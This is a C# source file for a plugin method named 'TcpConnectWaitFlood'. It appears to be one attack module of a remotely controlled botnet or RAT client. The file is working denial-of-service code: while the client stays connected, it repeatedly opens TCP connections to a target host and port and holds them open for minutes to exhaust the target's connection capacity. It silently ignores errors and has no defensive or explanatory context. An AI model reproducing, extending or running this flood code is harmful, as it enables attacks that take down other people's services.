using System.Net.Sockets;
using System.Threading;
using Plugin.Helper;

namespace Plugin.Methods;

internal class TcpConnectWaitFlood : Method
{
	public string Name { get; } = "TcpConnectWaitFlood";


	public void Run(string host, int port)
	{
		while (Client.itsConnect && !Common.CancellationTokenSource.IsCancellationRequested)
		{
			try
			{
				Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
				socket.Connect(host, port);
				for (int i = 0; i < 100; i++)
				{
					Thread.Sleep(5000);
					if (!Client.itsConnect || Common.CancellationTokenSource.IsCancellationRequested)
					{
						socket.Dispose();
						break;
					}
				}
				socket.Dispose();
			}
			catch
			{
			}
		}
	}
}
